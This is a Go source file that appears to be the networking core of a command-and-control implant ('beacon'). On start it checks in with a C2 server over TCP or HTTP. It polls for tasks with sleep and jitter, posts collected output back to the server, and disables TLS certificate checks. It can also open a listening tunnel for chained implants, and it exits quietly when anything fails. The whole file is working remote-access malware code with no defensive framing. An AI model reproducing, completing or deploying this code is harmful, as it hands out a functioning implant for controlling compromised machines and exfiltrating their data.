package core

import (
	"bytes"
	"crypto/tls"
	"io"
	"net"
	"net/http"
	"net/url"
	"os"
	"strings"
	"time"
)

var (
	Client = &http.Client{
		Timeout:   10*time.Second,
		Transport: &http.Transport{
			Proxy: func(*http.Request) (*url.URL, error) {
				if ProxyURL == "" { return nil, nil }
				return url.Parse(ProxyURL)
			},
			TLSHandshakeTimeout: 10*time.Second,
			TLSClientConfig:     &tls.Config{InsecureSkipVerify: true},
		},
	}
)

func init() {
	if strings.HasPrefix(C2_URL, "tcp") {
		TCP(JoinBytes([]byte(TCP_Header), IntAsByte(4, len(MetaByte)+4), IntAsByte(4, BeaconID), MetaByte))
	} else {
		if _, err := HTTP("GET", GetURL(PullInfo), GetHeader(PullInfo), nil); err != nil { os.Exit(0) }
	}
}

func TCP(Data []byte) {
	Sleep, Jitter = 100, 0
	Addr := strings.TrimPrefix(C2_URL, "tcp://")
	if IsLocal(C2_URL) {
		ln, err := net.Listen("tcp", Addr)
		if err != nil { os.Exit(0) }
		go func() {
			for {
				Conn, _ := ln.Accept()
				if _, OK := Tunnel.Load(BeaconID); OK {
					Conn.Close()
				} else {
					Conn.Write(Data)
					Tunnel.Store(BeaconID, Conn)
				}
			}
		}()
	} else {
		Conn, _ := net.Dial("tcp", Addr)
		_, err := Conn.Write(Data)
		if err != nil { os.Exit(0) }
		Tunnel.Store(BeaconID, Conn)
	}
}

func HTTP(Method, URL string, Header map[string]string, Body io.Reader) ([]byte, error) {
	Req, _ := http.NewRequest(Method, URL, Body)
	for Key, Value := range Header {
		if Key == "Host" {
			Req.Host = Value
		} else {
			Req.Header.Set(Key, Value)
		}
	}
	Res, err := Client.Do(Req)
	if err != nil { return nil, err }
	defer Res.Body.Close()
	return io.ReadAll(Res.Body)
}

func Pull() *bytes.Buffer {
	time.Sleep(time.Duration(RandInt(Sleep-Sleep*Jitter/100, Sleep))*time.Millisecond)
	if strings.HasPrefix(C2_URL, "http") {
		Data, _ := HTTP("GET", GetURL(PullInfo), GetHeader(PullInfo), nil)
		return ParseBytes(GetOutput(Data))
	}
	if Conn, OK := Tunnel.Load(BeaconID); strings.HasPrefix(C2_URL, "tcp") && OK {
		ReadFrom(Conn.(net.Conn), len(TCP_Header))
		Len := ByteAsInt(ReadFrom(Conn.(net.Conn), 4))
		return ParseBytes(ReadFrom(Conn.(net.Conn), Len))
	}
	return nil
}

func Push() {
	_PIPE_.Range(HOOK)
	if strings.HasPrefix(C2_URL, "http") && Buffer.Len() > 0 {
		HTTP("POST", GetURL(PushInfo), GetHeader(PushInfo), SetOutput(Buffer.Bytes()))
	}
	if Conn, OK := Tunnel.Load(BeaconID); strings.HasPrefix(C2_URL, "tcp") && OK {
		_, err := Conn.(net.Conn).Write(JoinBytes([]byte(TCP_Header), IntAsByte(4, Buffer.Len())))
		if err != nil { if IsLocal(C2_URL) { Tunnel.Delete(BeaconID) } else { os.Exit(0) } }
		if Buffer.Len() > 0 { io.Copy(Conn.(net.Conn), &Buffer) }
	}
	Buffer.Reset()
}